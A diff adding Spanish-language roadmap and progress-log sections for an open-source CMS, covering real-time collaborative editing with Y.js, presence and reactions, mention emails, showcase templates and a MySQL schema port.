+- [ ] **Tools adicionales**: `entry_schedule` (alias semántico de update), `entry_delete`, `branch_create`/`branch_merge`/`branch_diff`, `media_upload_from_url`, `media_generate_alt` (vision), `taxonomy_create`/`taxonomy_assign`, `og_generate`, `seo_audit`, `campaign_create`/`campaign_send`, `ab_test_create`/`ab_test_results`, `analytics_query` (read-only DSL).
+- [ ] **Resources** MCP: `csm://entry/{id}`, `csm://collection/{slug}/entries`, `csm://workspace/info`.
+- [ ] **Prompts predefinidos**: "weekly content recap", "broken links audit", "SEO improvement suggestions", "translate-this-post-to-X".
+- [ ] **Sessionful HTTP** + EventStore para resumibilidad cuando un agente largo se reconecta.
+- [ ] Rate-limit por API key + audit log de cada call MCP en `api_key_audit`.
+- [ ] **DOCS** dedicado en `/admin/api-docs/mcp` con ejemplos curl, Cursor remoto y prompts útiles.
+
+#### Editorial AI Agent (durable workflow)
+- [ ] **Vercel Workflow DevKit** (WDK) — install + setup. Crash-safe pause/resume.
+- [ ] **Workflow `weeklyContentPipeline`**: input = `{ ws, topic, count, tone, schedule }` → steps (research, draft, SEO optimize, generate cover, generate OG, schedule, notify reviewer).
+- [ ] **Workflow `autoTranslate`**: trigger en branch creada con label `i18n` → AI traduce a N idiomas configurables → COW per-locale → reviewer asignado per-locale.
+- [ ] **Workflow `contentHealthScan`**: cron weekly → todo el contenido → broken links + outdated facts (vs date) + accessibility (alt missing) + SEO (title length, meta desc) → reporte en `/admin/salud-contenido`.
+- [ ] **Workflow `abTestDesigner`**: input = entry → AI propone 3 variantes de título/hero → lanza A/B test → cron diario evalúa significancia → al alcanzar p<0.05 con >100 conv promueve winner.
+- [ ] **UI `/admin/agente`** — chat con el agent + historial de runs + cost por run.
+
+### F10d — Performance + PWA + Edge-first
+> Lighthouse 100x4 + PWA offline + RUM propio. Web Vitals como gate de CI.
+
+#### Lighthouse 100/100/100/100
+- [ ] Audit en `/`, `/blog/[slug]`, `/[locale]/...` con CI gate (script `pnpm lighthouse`).
+- [ ] Bundle analyzer (`@next/bundle-analyzer`) — admin < 250KB initial, público < 90KB.
+- [ ] Dynamic imports en admin: Tiptap, Page Builder, Tremor charts, dnd-kit.
+- [ ] Image optimization audit: AVIF/WebP forzado, responsive sizes (320/640/960/1280/1920), blurhash en TODOS los temas, lazy loading correcto.
+- [ ] Font subset + preload Geist Sans en sitio público.
+- [ ] Edge runtime audit para `/`, `/blog/...`, `/api/og/...` (ya parcial).
+
+#### PWA + offline drafts
+- [ ] **Manifest + service worker** (`next-pwa` o custom) con caching por estrategia (NetworkFirst para HTML, CacheFirst para assets).
+- [ ] **Dexie (IndexedDB)** para drafts offline en editor — autosave local cada 5s + sync al reconectar.
+- [ ] Install prompt + "Trabajar offline" toggle en topbar admin.
+- [ ] Offline indicator + queue de saves pendientes con retry.
+- [ ] Mobile-first: editor usable en móvil con bottom toolbar.
+
+#### Real User Monitoring propio (sustituye Vercel Analytics)
+- [ ] Edge log endpoint `/api/ingest/rum` — captura LCP, CLS, INP, TTFB + URL + ws + UA hash.
+- [ ] Tabla `rum_events` con cron agregador diario → `rum_daily` por (ws, url, dow).
+- [ ] Dashboard `/admin/analiticas/performance` con Tremor: percentiles p50/p75/p95, evolución semanal, top URLs lentas.
+- [ ] Web Vitals budget en CI: fail si p75 LCP > 1.5s en `/blog/...`.
+
+### F10e — Operability + Scale + Data hardening
+> Lo que hace que el CMS aguante producción real.
+
+#### Backups
+- [ ] **Cron diario** `pg_dump` → Vercel Blob (privado). Retención 30d. Tabla `backups` con metadata.
+- [ ] **Restore endpoint admin-only** + dry-run validation.
+- [ ] Backup test mensual (cron) que valida integridad del último dump.
+
+#### Audit log + activity feed exportable
+- [ ] Refactor activity_log para incluir TODOS los eventos críticos (auth, settings, billing, branch, workflow).
+- [ ] Export CSV/JSON desde `/admin/ajustes/auditoria`.
+- [ ] Filter por user/type/date.
+
+#### Retention policies
+- [ ] Cron diario: `ab_events` >90d → agregar a `ab_results_daily` y borrar raw.
+- [ ] Cron diario: `notifications` read >30d → delete.
+- [ ] Cron weekly: `revisions` per entry retiene últimas 50 + última publicada.
+- [ ] Cron weekly: `branch_activity` >180d archive.
+
+#### Diferidos F9c
+- [ ] Paginación cursor en `/admin/calendario` (L5).
+- [ ] Paginación cursor en `/admin/workflows` (L5).
+- [ ] Paginar `listEntryEvents` a 50 (L4).
+- [ ] Filter `isNull(entries.branchId)` en calendar workload (L2).
+- [ ] Filter `isNull(entries.branchId)` en SLA sweep (L3).
+- [ ] Workflow templates UI por colección — `/admin/colecciones/[id]/workflow` editor (L8).
+- [ ] Bulk transitions throttle / batch cola (L9).
+- [ ] iCal token revoke endpoint dedicado (L10).
+- [ ] `Notification` type rename → `EditorialNotification` (L11).
+
+#### Diferidos F9a
+- [ ] Imports residue cleanup (terms/redirects/media) — track targetIds por kind en import_items (L1).
+- [ ] Imports ownership check (revert solo creator+admin) (L2).
+- [ ] Magic-bytes validation en upload imports (L4).
+- [ ] errorLog append en lugar de overwrite (L5).
+
+#### Diferidos F9b
+- [ ] Branch restore (papelera) — UI `/admin/branches/papelera` con N días retención (L2).
+- [ ] Rebase explícito (traer cambios de main a branch) (L3).
+
+### F10f — Launch Polish + Spectacular Demo
+> El último 5% que decide la primera impresión.
+
+#### Seed data espectacular
+- [ ] 1 blog real "Diario CSM" con 3 posts (cover IA via Replicate Flux, contenido real con IA inline).
+- [ ] 1 portfolio "Estudio Kairós" con 4 proyectos.
+- [ ] 1 docs site "CSM Docs" con 6 páginas (Quick Start, Conceptos, API, CLI, MCP, Recipes).
+- [ ] 1 newsletter "Boletín Espectacular" con 10 subscribers fake + 1 campaign enviada.
+- [ ] 1 landing hero con A/B test activo.
+- [ ] 1 form "Contacto" con 3 submissions demo.
+- [ ] 1 workflow demo (post en "review" asignado a 2 usuarios).
+- [ ] Branch demo con conflicto resuelto (showcase del wow factor F9b).
+
+#### README + Marketing
+- [ ] **README en español** con GIFs animados (uno por wow moment): editor IA inline, page builder, branching, MCP server desde Claude, AI agent, Y.js presence.
+- [ ] Badges (CI, license, Lighthouse, npm, deploy).
+- [ ] Screenshots del admin en dark mode.
+- [ ] **Landing en `/`** con hero + 5 sections (editor / builder / IA / MCP / deploy).
+- [ ] Video walkthrough 3min.
+
+#### Deploy
+- [ ] **Migrar `vercel.json` → `vercel.ts`** (recomendado 2026, full TypeScript, dynamic logic).
+- [ ] **Deploy to Vercel button** funcional con env wizard (Neon, Resend, UploadThing, Stripe optional).
+- [ ] `.env.example` exhaustivo con todas las keys + descripción + link a docs del proveedor.
+- [ ] Custom domain auto-SSL flow probado E2E.
+- [ ] Health check endpoint `/api/health` (db ping + provider checks).
+
+#### Onboarding pulido
+- [ ] AI Site Generator end-to-end: usuario describe idea → IA genera todo (workspace, branding, posts demo, navegación, hero copy) en < 30s.
+- [ ] Tour interactivo `/admin/tour` (5 steps).
+- [ ] Empty states con ilustraciones SVG + CTA.
+
+## 2026-05-04 — F10b Bloque 1 ✅ entregado
+
+> Y.js + LISTEN/NOTIFY + Tiptap collab básico funcionando 2-tabs. Cierra F9c L1+L7 (notifications cross-instancia). Sin Hocuspocus extra: provider custom SSE+POST que arranca en Vercel out-of-the-box.
+
+### Schema (drizzle push aplicado)
+- [x] `collab_snapshots` (entryId PK, workspaceId, state base64, bytes, updatedAt)
+- [x] `collab_updates` (entryId, workspaceId, update base64, clientId, userId, createdAt) + index `(entryId, createdAt)`
+
+### Pubsub cross-instancia
+- [x] `src/lib/pubsub.ts` — Postgres LISTEN/NOTIFY helper. 1 conexión long-lived por instancia (`max:1`, idle_timeout:0, prepare:false). Auto-stripping del sufijo `-pooler.` para Neon (LISTEN no funciona sobre el pooler). Subscriptores locales se suman a un Set por canal; primer sub abre el LISTEN, los siguientes son in-memory fanout. Publish via `pg_notify(channel, json)` por la misma conexión.
+- [x] Refactor `src/editorial/notifications.ts` (cierra F9c L1+L7) — el bus in-memory bucket-keyed por `(ws,user)` ahora se monta sobre un único LISTEN por workspace `notif:ws:{wsId}`. Ref-counting para auto-release del LISTEN. La emisión publica el row serializado en JSON; los listeners locales filtran por `userId` antes de entregar al SSE.
+
+### Y.js server-side
+- [x] `src/collab/server.ts`:
+  - `checkEntryAccess(entryId, wsId)` — gate workspace
+  - `loadInitialState(entryId, wsId)` — devuelve `{snapshot:base64|null, updates:base64[], bodyJson}`. Si no hay nada (primer cliente), incluye `entries.body` para sembrar.
+  - `appendUpdate({entryId, wsId, userId, clientId, update})` — INSERT + NOTIFY. Tras N updates (50) o T (30s) dispara `compactSnapshot` en background.
+  - `publishAwareness({entryId, clientId, update, user})` — NOTIFY efímero, NO persiste.
+  - `compactSnapshot(...)` — applyUpdate todos los pending → encodeStateAsUpdate → UPSERT en `collab_snapshots` → DELETE updates `lte(cutoff)`. Idempotente entre instancias (último UPDATE gana, CRDT-equivalente).
+  - `base64ToUint8` / `uint8ToBase64` Buffer-aware.
+- [x] Canales: `collab:up:{entryId}` (updates) y `collab:aw:{entryId}` (awareness).
+- [x] Cap MAX_UPDATE_BYTES = 64KB.
+
+### Endpoints
+- [x] `GET /api/collab/[entryId]/events` — SSE. Eventos: `connected`, `init` (snapshot+updates+bodyJson), `update` (binary remoto), `awareness` (presence/cursor remoto), `heartbeat` 25s. Cleanup en abort + send-failure.
+- [x] `POST /api/collab/[entryId]/update` — body Zod `{clientId, update:base64}`. requireWorkspace("author").
+- [x] `POST /api/collab/[entryId]/awareness` — body Zod incluye `user:{id,name,color,role,avatarUrl?}`. **Hardening: `body.user.id !== session.user.id` → 403** (anti-suplantación de presence).
+
+### Provider client-side
+- [x] `src/collab/provider.ts` — `CollabProvider` class custom. EventSource para SSE (auto-reconnect con backoff exponencial cap 30s). POST coalesced 50ms para updates (`Y.mergeUpdates`). POST coalesced 80ms para awareness. `sendBeacon` en `beforeunload` con awareness null para limpiar presence. Color determinístico hash(userId) → paleta 10 colores.
+- [x] `src/collab/use-collab.ts` — hook React. `Y.Doc` único por mount (useRef), instancia el provider, expone `{doc, status, peers, setOnSeed}`. Awareness `change` → setPeers().
+
+### Editor
+- [x] `EditorShell` recibe nuevo prop `currentUser:{id,name,image,role}`. Llama `useCollab` y mete `Collaboration.configure({document: collab.doc})` en el array de extensions. Apaga `StarterKit.undoRedo` (Tiptap 3) — Collaboration trae undo manager Y.js.
+- [x] `setOnSeed` callback que ejecuta `editor.commands.setContent(body, {emitUpdate:true})` SOLO cuando el server confirmó que no había snapshot ni updates. Primer cliente siembra desde `entries.body`; siguientes reciben snapshot/updates y aplican via Y.applyUpdate.
+- [x] Header: nuevo `<CollabIndicator status peerCount/>` antes del SaveIndicator. Muestra "Conectando…" / "En vivo" / "N personas más editando" / "Offline".
+- [x] `page.tsx` pasa `currentUser` con `id`, `name||email`, `image`, `ctx.role`.
+
+### Validación
+- [x] typecheck verde
+- [x] biome check verde (organize-imports + format auto-fix aplicado, no warnings)
+- [x] next build verde (solo warning ignorable de `@aws-sdk/client-s3` opcional pre-existente)
+- [x] El autosave existente sigue funcionando: `editor.on("update")` dispara `saveEntry` con `editor.getJSON()` que refleja el merged Y.Doc; cada peer guarda idempotentemente el mismo contenido convergido.
+
+## 2026-05-04 — F10b Bloque 2 ✅ entregado
+
+> Cursors remotos + presence avatars cluster en topbar editor. Tiptap `CollaborationCursor` enchufado al awareness de nuestro provider custom.
+
+### Wire de cursors
+- [x] `npm i @tiptap/extension-collaboration-cursor@3.0.0` (peer dep `@tiptap/core@^3.0.0`).
+- [x] **Refactor `useCollab`**: Y.Doc + Awareness se crean sincronamente con `useRef` (estaban diferidos al useEffect del provider, lo que rompía el primer render del editor). El provider deja de instanciar Awareness internamente — lo recibe del hook (`opts.awareness`).
+- [x] Provider escribe DOS campos en awareness:
+  - `user` (name + color) — lo posee `CollaborationCursor` para renderizar caret/label.
+  - `csmUser` (id, name, color, role, avatarUrl) — para presence cluster + audit.
+  Esto evita que CollaborationCursor sobrescriba nuestros campos extendidos en su `mount` interno.
+- [x] `useCollab` lee `csmUser` con fallback a `user` por compatibilidad con peers que no tengan nuestro provider.
+- [x] `Awareness.destroy()` movido al `useEffect` final del hook (ya no en el `provider.destroy()` que se llama en cada cleanup de conexión).
+- [x] Editor monta `CollaborationCursor.configure({ provider: { awareness: collab.awareness }, user: { name, color } })`.
+
+### CSS de cursors
+- [x] `editor-styles.css` — bloque dedicado:
+  - `.collaboration-cursor__caret` con `border-left: 2px solid var(--peer-color)`.
+  - `.collaboration-cursor__label` posicionado top, fondo color del peer, fade-out 3s tras cambio (animación `csm-cursor-fade`).
+  - `:hover` muestra label permanente.
+  - `.collaboration-cursor__selection` con `mix-blend-mode: multiply` + `opacity: 0.4` para legibilidad sobre cualquier fondo del editor.
+
+### Presence avatars cluster
+- [x] `src/components/admin/editor/presence-avatars.tsx` — componente standalone:
+  - `<PresenceAvatars peers max={4} onJumpToPeer />`.
+  - Hasta 4 avatars visibles + chip "+N" para overflow.
+  - Avatar con color de fondo del peer + iniciales blancas (drop-shadow para legibilidad).
+  - Si hay `avatarUrl`, lo pinta como `background-image` (scape `\` `'` `"` con `cssEscape`) para evitar `<img>` vs `<Image/>` y XSS via avatar URL.
+  - Tooltip on hover: nombre + rol humanizado ("Editor", "Autor", "Admin", "Owner", "Lector").
+  - `onJumpToPeer` opcional (lo cablearé en B3 al following mode).
+- [x] Topbar editor: `<PresenceAvatars peers={collab.peers} max={4}/>` antes del `CollabIndicator`. Solo se renderiza si hay peers.
+
+### Validación
+- [x] typecheck verde
+- [x] biome verde (corrección: aria-label="" inválido → `aria-hidden`; `Awareness` import como type)
+- [x] next build verde
+
+## 2026-05-04 — F10b Bloque 3 ✅ entregado (EL DIFERENCIADOR)
+
+> Presence en TODO el admin + following mode + reactions live en threads. Único en CMS open-source 2026.
+
+### Schema (drizzle push aplicado)
+- [x] `presence_sessions` (id, workspaceId, userId, clientId, route, entryId, lastSeenAt) + UNIQUE `(ws, clientId)` + index `(ws, lastSeenAt)` + partial index `(ws, entryId) WHERE entryId IS NOT NULL`.
+- [x] `editorial_reactions` (id, ws, messageId, threadId, userId, emoji, createdAt) + UNIQUE `(messageId, userId, emoji)` + index `(threadId, createdAt)`.
+
+### Backend presence
+- [x] `src/presence/server.ts` — UPSERT heartbeat (key: `(ws, clientId)`), `entryIdFromRoute(path)` regex `/admin/contenido/{uuid}`, `listActivePresence(ws)` con join a users (ventana 60s), `purgeStalePresence()` cleanup 5min, NOTIFY canal `presence:ws:{wsId}` con payload tipado.
+- [x] Endpoints:
+  - `POST /api/admin/presence/heartbeat` (15s desde el cliente)
+  - `POST /api/admin/presence/leave` (vía `sendBeacon` en `beforeunload`)
+  - `GET /api/admin/presence/stream` SSE (init snapshot + presence + heartbeat 25s)
+
+### Frontend presence
+- [x] `src/presence/context.tsx` — `PresenceProvider` montado en admin layout. Heartbeat al cambiar pathname + interval 15s, sendBeacon en `pagehide`/`beforeunload`. clientId estable por pestaña (sessionStorage). SSE con `init`/`presence` events. Following mode: `setFollow(peer)` y al recibir `update` del peer, `router.push(peer.route)` si cambia.
+- [x] `<PresenceStack mode={...} />` componente reusable: filtros `kind: "all" | "entry" | "route"`, max+overflow chip "+N", tooltip name+rol humanizado, color hashed, dot verde "live", click = follow.
+- [x] `<FollowingBanner />` sticky bajo topbar con color del peer + botón detener.
+- [x] `<HotRightNow />` widget dashboard: agrupa peers por `entryId`, ordena por concurrencia desc, top 5 con ring de gradient amber→rose, escapa al route del peer al click. NO renderiza si no hay actividad (evita widget vacío).
+- [x] **Surfaces wired** (avatars en sitio):
+  - `/admin/contenido` posts table — junto al título de cada fila (size 20, max 3).
+  - `/admin/workflows` kanban — en cards entre el título y el grip handle (size 18, max 2).
+  - `/admin/calendario` — en cards de mes/semana (size 14, max 2).
+  - Dashboard `/admin` — `<HotRightNow/>` entre KPIs y TopPosts.
+
+### Reactions live (cierra plan F10b "realtime reactions en comments")
+- [x] `src/editorial/reactions.ts` — `toggleReaction({ws, messageId, emoji})` idempotente (DELETE if exists else INSERT) con whitelist regex `\p{Extended_Pictographic}|\p{Emoji_Component}|‍` (ZWJ joiner). Re-verifica `message ∈ thread ∈ workspace` defensa-en-profundidad. `loadReactionsForThreads({threadIds, myUserId})` agrega counts + `mine`.
+- [x] Server action `toggleReactionAction(messageId, emoji)` en `workflows/_actions.ts`.
+- [x] **NOTIFY al MISMO canal `presence:ws:{wsId}`** con `kind: "reaction.add"|"reaction.remove"`. Reusa el SSE existente — no monto otro stream.
+- [x] `PresenceProvider` extendido: discrimina `kind` y dispatcha reactions a un Map `<threadId, Set<listener>>` interno. Expone `subscribeReactions(threadId, fn)`.
+- [x] `<ThreadReactions threadId messageId myUserId initial>` componente con:
+  - Optimistic update en click (toggle) + rollback en error.
+  - Suscripción al stream de presence para `kind: reaction.*`.
+  - Animación `animate-csm-pulse` (keyframes en globals.css) cuando llega un add live.
+  - Picker de 6 emojis comunes (`👍 ❤️ 🎉 🚀 👀 🤔`).
+  - Conteos por emoji con highlight si `mine`.
+- [x] `EditorialDrawer` recibe `reactionsByMessage` y renderiza `<ThreadReactions>` bajo cada mensaje.
+- [x] `/admin/contenido/[id]/page.tsx` carga `loadReactionsForThreads(threadIds, myUserId)` y agrupa por messageId.
+
+### Validación
+- [x] typecheck verde
+- [x] biome verde (organize-imports + format auto-fix; corregido `role="dialog"` por accesibilidad)
+- [x] next build verde
+
+## 2026-05-04 — F10b Bloque 4 ✅ entregado · F10b CERRADO
+
+> Mentions email Resend (offline-only) que cierra **F9b L5**, integrado en `notifyComment` sin doble-código en `createThread`/`replyToThread`.
+
+### Implementación
+- [x] `src/presence/server.ts`: añadido `whoIsOnline(ws, userIds)` que devuelve `Set<string>` con los IDs online (`lastSeenAt > now() - 60s`). Single query con `selectDistinct` filtrado por workspaceId.
+- [x] `src/lib/email.ts`: nuevo `sendMentionEmail({to, recipientName, actorName, workspaceName, entryTitle, preview, url})`. Template HTML branded (gradient `#9b5cff → #ff5db1`) + `<blockquote>` con preview del comentario. **Escape de HTML en el preview** (replace `& < >`) para evitar HTML injection en email body. Fallback `text` plano para clientes sin HTML.
+- [x] `src/editorial/comments.ts`: `notifyComment` ahora dispara `void emailOfflineMentions(...)` tras `emitNotificationsBatch`. La función helper resuelve email + name de los users mentioned + nombre del workspace en una query paralela (`Promise.all`), filtra por offline (vía `whoIsOnline`), construye URL absoluta con `NEXT_PUBLIC_APP_URL ?? https://${VERCEL_URL}` y dispara `sendMentionEmail` por cada uno con `.catch(() => {})` para que un fallo individual no afecte a otros.
+- [x] **Best-effort**: el outer `.catch(() => {})` garantiza que el email NO rompe el flow del comment (los notifications + bell SSE siempre se envían primero).
+
+### Decisión clave: NO email si está online
+- Si el user mencionado está activo en el admin, el bell SSE en realtime ya lo notifica con audio + badge → email sería ruido.
+- Solo offline (sin sesión presence en últimos 60s) recibe email.
+- Esto cierra el patrón "ruido vs señal" → mentions actionable solo cuando el user no está mirando.
+
+### Validación
+- [x] typecheck verde
+- [x] biome verde (auto-fix de format aplicado)
+- [x] next build verde
+- [x] Compatible con `features.email=false`: cuando no hay `RESEND_API_KEY`, `sendEmail` cae al mock y loggea preview a stdout (existente).
+
+### F10b — Cierre global ✅
+- [x] B1 ✅ Y.js infra + LISTEN/NOTIFY pubsub + Tiptap collab básico (cierra F9c L1+L7)
+- [x] B2 ✅ CollaborationCursor + presence avatars editor
+- [x] B3 ✅ Presence en TODO admin + following mode + reactions live (DIFERENCIADOR único 2026)
+- [x] B4 ✅ Mentions email offline (cierra F9b L5)
+
+### Stack final
+- Y.js (`yjs`, `y-protocols`, `y-prosemirror` instalado para fallback)
+- Tiptap collaboration (`@tiptap/extension-collaboration@3`, `@tiptap/extension-collaboration-cursor@3`)
+- Postgres LISTEN/NOTIFY (cero deps adicionales)
+- 4 nuevas tablas (`collab_snapshots`, `collab_updates`, `presence_sessions`, `editorial_reactions`)
+- 7 nuevos endpoints (`/api/collab/[id]/{events,update,awareness}`, `/api/admin/presence/{stream,heartbeat,leave}`)
+- Cero infra adicional (Vercel + Neon free tier es suficiente).
+
+## 2026-05-05 — Plantillas Showcase Espectaculares ✅ entregado
+
+> Salto cualitativo de las plantillas de página al nivel motionsites.ai: cada plantilla es ahora un **showcase component** custom con vídeo HLS, scroll-driven marquees, sticky stacking cards, parallax, glassmorphism, char-by-char text reveal, magnetic cursor, etc. Reemplaza el viejo preview block-based.
+
+### Arquitectura
+- `src/templates/showcase/_lib/primitives.tsx` — 9 primitives reusables (cero deps nuevas):
+  - `FadeIn`, `Magnet`, `CycleText`, `AnimatedTextReveal`, `MarqueeRow` (scroll-driven o autoplay), `StickyStackCard`, `ParallaxColumn`, `VideoLoop` (crossfade entre loops), `LiquidGlass`, `Spotlight`, `LoadingScreen`.
+  - Construidos sobre framer-motion 11 ya instalado: `useScroll`, `useTransform`, `useMotionValue`, `AnimatePresence`. Cero GSAP, cero hls.js.
+- `src/templates/showcase/_lib/styles.css` — 9 vibe classes (jack, michael, asme, securify, targo, nimbus, substack, magazine, mint, docs) + Google Fonts via `@import` arriba del file (Kanit, Instrument Serif, Inter, Readex Pro, Rubik, Newsreader).
+- `src/templates/showcase/_lib/assets.ts` — catálogo curado de URLs (vídeos cloudfront, GIFs motionsites, imágenes higgs, unsplash helpers).
+- `src/templates/showcase/index.tsx` — map id → componente; helper `getShowcase(id)`.
+
+### 8 plantillas showcase (1 por id existente)
+- [x] `portfolio-spotlight` → **Jack 3D Creator**: hero magnético + portrait + marquee scroll-driven 21 GIFs en 2 filas opuestas + char-reveal about + 3D corners + services + 3 sticky stack cards.
+- [x] `agency-spotlight` → **Michael Smith editorial dark**: loading screen + nav glass-pill + role cycling + bento 4 + journal pills + parallax columns 2 + stats + footer marquee gigante.
+- [x] `saas-magnetic` → **Asme liquid glass**: hero crossfade vídeo + email pill + about + featured video full-bleed + Innovation×Vision split + 2 service cards.
+- [x] `launch-marquee` → **Securify+Targo dark**: hero staggered headline + 3 stat blocks posicionados + glass widget consultoría + sectors marquee + 3 pillars + pricing 2-tier con clipped corners.
+- [x] `docs-aurora` → **Power AI / Nimbus**: hero gradient text indigo→purple→amber + nav neutral + logo marquee + 6 docs grid + code sample + community.
+- [x] `coming-soon-typewriter` → **Mint pre-launch**: hero countdown live (días/h/min/seg) + email capture liquid-glass + 3 perks + roadmap timeline.
+- [x] `blog-particles` → **Magazine paper**: masthead serif + featured 8/4 + sidebar últimos + categorías grid colored + 3-col stories + newsletter inline.
+- [x] `newsletter-typewriter` → **Substack premium**: signup card + preview número con paywall fade gradient + testimonio gigante + pricing 2-tier elegante + archive list con badges Free/Premium.
+
+### Wiring
+- [x] `/template-preview/[id]` ahora prefiere `getShowcase(id)`; fallback al render block-based.
+- [x] CSP: `img-src` ampliado con `cloudfront.net`, `figma.site`, `motionsites.ai`, `images.higgs.ai`. `style-src` con `fonts.googleapis.com`. `font-src` con `fonts.gstatic.com`. `media-src https:` ya estaba (vídeos OK).
+- [x] Galería `/admin/plantillas` con notice explicando que el preview es la versión espectacular y al insertar se simplifica la versión editable.
+
+### Patrón clave
+**Showcase ≠ block layout editable**. Cada plantilla mantiene su `buildLayout()` block-based (lo que se inserta al usar la plantilla, editable desde el page builder), pero el preview usa el showcase custom. Decisión consciente: la versión espectacular requiere ~600-1000 líneas de React custom por plantilla y no se puede expresar en bloques sin añadir ~5 bloques premium nuevos al registry (diferido a F10x).
+
+### Validación
+- [x] typecheck verde (`npm run typecheck`)
+- [x] biome verde (`npx biome check src/templates/showcase`)
+
+### Estado
+Las plantillas ahora están al nivel visual de las que aparecen en `motionsites.ai/prompts`. Cuando el usuario hover sobre un card en `/admin/plantillas`, el iframe carga la versión showcase (motion-rich, vídeo, parallax, etc). Diferenciador claro vs WordPress / Strapi / Sanity / Ghost — ningún CMS open-source 2026 ofrece previews así.
+
+---
+
+## 2026-05-05 — Tarea 15: Schema MySQL completo (77 tablas) ✅ entregado
+
+> Multi-DB design (ADR-001..007 en `docs/architecture/multi-db-design.md`). Postgres queda como dialect default; MySQL 8.4+ ahora tiene schema paralelo paritario.
+
+### Entregable
+- [x] `src/db/schema.mysql.ts` con las 77 tablas (5 POC + 72 portadas en esta tarea).
+- [x] Type exports lógicamente idénticos a `schema.pg.ts` (mismo set de fields camelCase y mismos tipos JS).
+- [x] `npx tsc --noEmit` verde (cero errores nuevos vs baseline).
+- [x] `npx biome check src/db/schema.mysql.ts` verde.
+
+### Tablas portadas (72 nuevas)
+passkeys, two_factors, rate_limits, members, invitations, collections, branches, branch_activity, branch_comments, entries, revisions, entry_assignments, entry_workflow_events, editorial_threads, editorial_messages, editorial_calendar_tokens, taxonomies, terms, entry_terms, media_folders, media, comments, search_index_jobs, subscribers, subscriber_confirmations, segments, campaigns, campaign_recipients, email_templates, drips, drip_enrollments, email_events, tiers, memberships, member_sessions, member_magic_links, member_events, personalization_rules, forms, form_versions, submissions, api_keys, api_key_audit, webhooks, webhook_deliveries, automations, automation_runs, automation_steps, idempotency_keys, pages, symbols, themes, menus, redirects, settings, activity_log, notifications, analytics_events, ab_tests, ab_assignments, ab_events, imports, import_items, entry_health, entry_health_issues, ai_usage_daily, csp_reports, collab_snapshots, collab_updates, presence_sessions, editorial_reactions, ai_provider_configs.
+
+### Decisiones de mapping no triviales
+1. **`vector("embedding", { dimensions: 1536 })`** → `customType` que renderiza `VECTOR(1536)` (MySQL 9+). En MySQL 8.4 el migrador degrada a `VARBINARY(8192)` o delega Qdrant via `src/search/vector/`. Helper `vector(...)` con `toDriver/fromDriver` para serializar `number[]` ↔ string `[1,2,3]` formato.
+2. **`text("col").array()`** (11 columnas: workspaces.locales, branchComments.mentions, editorialMessages.mentions, media.aiTags, media.tagsManual, subscribers.tags, comments…tags via aux, forms.notificationEmails, submissions.attachments, submissions.spamReasons, apiKeys.scopes, webhooks.events) → `json("col").$type<T[]>()` interim. Tarea 18 (ADR-002) los normaliza a tablas auxiliares con FK + position.
+3. **Partial unique indexes Postgres** (`UNIQUE WHERE col IS NOT NULL`) → MySQL UNIQUE permite múltiples NULL por defecto, así que `entries_branch_original_idx`, `entries_ws_origin_ref_idx`, `branches_preview_token_idx` mantienen su semántica natural sin cambios.
+4. **Partial unique sobre `bool=true`** (`branches_ws_default_idx WHERE isDefault=true`, `entry_assignments_entry_role_active_idx WHERE completedAt IS NULL`) → MySQL no soporta. Bajado a non-unique index; enforcement queda en lógica app (`createBranch` valida única main; `createAssignment` valida absence de slot activo).
+5. **Expression unique con `COALESCE`** (`ai_usage_daily_unique_idx`) → en MySQL exigimos al caller que normalice `userId=''` (empty string) en lugar de NULL para que el unique compuesto funcione directo. Documentado en JSDoc.
+6. **`uuid().defaultRandom()`** → `varchar(36)` sin default; `crypto.randomUUID()` app-side antes del INSERT (ADR-003).
+7. **TEXT columns indexed/uniqued** → convertidas a `varchar(N)` con N apropiado (email=320, slug=120, token=120/255, hash=128, url=2048, path=1024). MySQL TEXT no se puede UNIQUE INDEX sin prefix length.
+8. **`text("col").default("...")`** → `varchar(N).default(...)`. MySQL TEXT no admite default.
+9. **`timestamp.defaultNow()`** → `timestamp({fsp:3}).default(sql\`CURRENT_TIMESTAMP(3)\`)` para preservar precisión de milisegundos.
+10. **Self-references** (`comments.parentId`, `branchComments.parentId`) → cambian de `AnyPgColumn` a `AnyMySqlColumn`.
+11. **`webhookDeliveries.eventId`** Postgres tiene `defaultRandom()`. En MySQL queda sin default → caller (`enqueueWebhookDelivery`) genera con `crypto.randomUUID()`.
+
+### Verificación
+- 77 tablas `mysqlTable(...)` ↔ 77 tablas `pgTable(...)` (paridad confirmada con grep).
+- Schema barrel `src/db/schema.ts` SIN tocar (sigue re-exportando Postgres como verdad TS).
+- `src/db/client.ts`, call-sites, `drizzle.config.ts` SIN tocar.
+
+### Próximo paso
+Tarea 16 (E2E matrix) podrá levantar Docker MySQL y validar flow crítico end-to-end. Tarea 18 (ADR-002) normaliza las 11 columnas array a tablas auxiliares con helper `arrayCol(...)`.
